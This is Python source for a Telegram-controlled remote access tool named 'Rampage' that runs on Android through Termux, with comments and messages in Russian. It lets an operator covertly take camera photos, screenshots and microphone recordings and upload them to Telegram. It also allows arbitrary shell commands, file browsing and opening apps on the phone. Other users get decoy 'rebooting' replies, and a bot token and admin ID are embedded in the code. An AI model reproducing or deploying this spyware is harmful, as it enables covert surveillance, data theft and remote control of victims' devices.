import os, subprocess, time, requests, json, threading
from flask import Flask

app = Flask(__name__)
TOKEN = "8602231936:AAERH9y8Rfc-xOJBiPf4eKSt6NlQMBr2JGk"
ADMIN_ID = "7854185047"
offset = 0
current_dir = "/sdcard"

def send(chat_id, text, keyboard=None):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    data = {"chat_id": chat_id, "text": text[:4000]}
    if keyboard:
        data["reply_markup"] = json.dumps({"inline_keyboard": keyboard})
    try:
        requests.post(url, data=data, timeout=10)
    except:
        pass

def send_photo(chat_id, path):
    try:
        with open(path, "rb") as f:
            requests.post(
                f"https://api.telegram.org/bot{TOKEN}/sendPhoto",
                data={"chat_id": chat_id},
                files={"photo": f}
            )
    except:
        send(chat_id, "❌ Ошибка фото")

def send_file(chat_id, path):
    try:
        with open(path, "rb") as f:
            requests.post(
                f"https://api.telegram.org/bot{TOKEN}/sendDocument",
                data={"chat_id": chat_id},
                files={"document": f}
            )
    except:
        send(chat_id, "❌ Ошибка файла")

def exec_cmd(cmd):
    try:
        return subprocess.getoutput(cmd)[:4000]
    except:
        return "Ошибка"

def play_audio(chat_id, url):
    try:
        os.system(f"termux-media-player play {url}")
        os.system("termux-volume music 15")  # максимальная громкость
        send(chat_id, "🔊 Аудио проигрывается на полной громкости!")
    except Exception as e:
        send(chat_id, f"❌ Ошибка: {e}")

def toggle_flash(chat_id):
    try:
        os.system("termux-torch on")
        send(chat_id, "🔦 Фонарик включён")
        time.sleep(3)
        os.system("termux-torch off")
    except:
        send(chat_id, "❌ Ошибка фонарика")

def vibrate(chat_id):
    try:
        os.system("termux-vibrate -d 1000")
        send(chat_id, "📳 Вибрация включена")
    except:
        send(chat_id, "❌ Ошибка вибрации")

def open_app(chat_id, pkg):
    try:
        os.system(f"am start {pkg}")
        send(chat_id, f"✅ Открыто: {pkg}")
    except:
        send(chat_id, f"❌ Приложение не найдено: {pkg}")

keyboard = [
    [{"text": "📷 Камера", "callback_data": "cam"}],
    [{"text": "📸 Скриншот", "callback_data": "scr"}],
    [{"text": "🎤 Микрофон", "callback_data": "mic"}],
    [{"text": "🔊 Аудио", "callback_data": "play"}],
    [{"text": "🔦 Фонарик", "callback_data": "flash"}],
    [{"text": "📳 Вибрация", "callback_data": "vibrate"}],
    [{"text": "📂 Файлы", "callback_data": "ls"}],
    [{"text": "❌ Закрыть", "callback_data": "close"}]
]

def bot_loop():
    global offset, current_dir
    while True:
        try:
            r = requests.get(
                f"https://api.telegram.org/bot{TOKEN}/getUpdates",
                params={"offset": offset, "timeout": 10},
                timeout=15
            )
            for u in r.json().get("result", []):
                offset = u["update_id"] + 1

                if "callback_query" in u:
                    q = u["callback_query"]
                    cid = str(q["message"]["chat"]["id"])
                    data = q["data"]

                    if cid != ADMIN_ID:
                        send(cid, "⛔ Доступ запрещён", None)
                    else:
                        if data == "cam":
                            path = "/sdcard/cam.jpg"
                            os.system(f"termux-camera-photo -c 0 {path}")
                            send_photo(cid, path)
                        elif data == "scr":
                            path = "/sdcard/scr.png"
                            os.system(f"termux-screenshot {path}")
                            send_photo(cid, path)
                        elif data == "mic":
                            path = "/sdcard/mic.aac"
                            os.system(f"termux-microphone-record -d 5 -f {path}")
                            send_file(cid, path)
                        elif data == "play":
                            send(cid, "🔊 Отправь ссылку на аудио (/play URL)")
                        elif data == "flash":
                            toggle_flash(cid)
                        elif data == "vibrate":
                            vibrate(cid)
                        elif data == "ls":
                            try:
                                files = "\n".join(os.listdir(current_dir))[:4000]
                                send(cid, f"📂 {current_dir}\n\n{files}", keyboard)
                            except:
                                send(cid, "❌ Ошибка", keyboard)
                        elif data == "close":
                            send(cid, "❌ Меню закрыто", None)

                    try:
                        requests.get(
                            f"https://api.telegram.org/bot{TOKEN}/answerCallbackQuery",
                            params={"callback_query_id": q["id"]}
                        )
                    except:
                        pass

                else:
                    text = u.get("message", {}).get("text", "")
                    cid = str(u.get("message", {}).get("chat", {}).get("id"))
                    username = u.get("message", {}).get("chat", {}).get("first_name", "друг")

                    if not text:
                        continue

                    if cid != ADMIN_ID:
                        if text == "/start":
                            send(cid, f"Привет, {username}! Бот перезагружается. Ожидайте...")
                        else:
                            send(cid, "Бот временно недоступен. Напишите /start")
                        continue

                    if text == "/start":
                        send(cid, "✅ Rampage активен. Выбери действие:", keyboard)

                    elif text.startswith("/cam"):
                        path = "/sdcard/cam.jpg"
                        os.system(f"termux-camera-photo -c 0 {path}")
                        send_photo(cid, path)

                    elif text.startswith("/scr"):
                        path = "/sdcard/scr.png"
                        os.system(f"termux-screenshot {path}")
                        send_photo(cid, path)

                    elif text.startswith("/mic"):
                        path = "/sdcard/mic.aac"
                        os.system(f"termux-microphone-record -d 5 -f {path}")
                        send_file(cid, path)

                    elif text.startswith("/play"):
                        url = text[6:].strip()
                        if url:
                            play_audio(cid, url)
                        else:
                            send(cid, "❌ Используй: /play ссылка_на_аудио")

                    elif text.startswith("/flash"):
                        toggle_flash(cid)

                    elif text.startswith("/vibrate"):
                        vibrate(cid)

                    elif text.startswith("/open"):
                        pkg = text[6:].strip()
                        if pkg:
                            open_app(cid, pkg)
                        else:
                            send(cid, "❌ Используй: /open com.package.name")

                    elif text.startswith("/shell"):
                        out = exec_cmd(text[7:])
                        send(cid, f"📟 {out}", keyboard)

                    elif text == "/ls":
                        try:
                            files = "\n".join(os.listdir(current_dir))[:4000]
                            send(cid, f"📂 {current_dir}\n\n{files}", keyboard)
                        except:
                            send(cid, "❌ Ошибка", keyboard)

                    elif text.startswith("/cd"):
                        try:
                            new_dir = text[4:].strip()
                            if os.path.exists(new_dir) and os.path.isdir(new_dir):
                                current_dir = new_dir
                                send(cid, f"✅ Перешли в {current_dir}", keyboard)
                            else:
                                send(cid, "❌ Папка не найдена", keyboard)
                        except:
                            send(cid, "❌ Ошибка", keyboard)

                    elif text == "/kill":
                        send(cid, "⛔ Остановка")
                        os._exit(0)

                    else:
                        send(cid, "❌ Неизвестно. Используй кнопки или команды:\n/cam\n/scr\n/mic\n/play\n/flash\n/vibrate\n/open\n/shell\n/ls\n/cd\n/kill", keyboard)

        except Exception as e:
            print(e)
            time.sleep(3)

@app.route('/')
def home():
    return "Rampage работает"

if __name__ == "__main__":
    threading.Thread(target=bot_loop, daemon=True).start()
    app.run(host="0.0.0.0", port=8080)
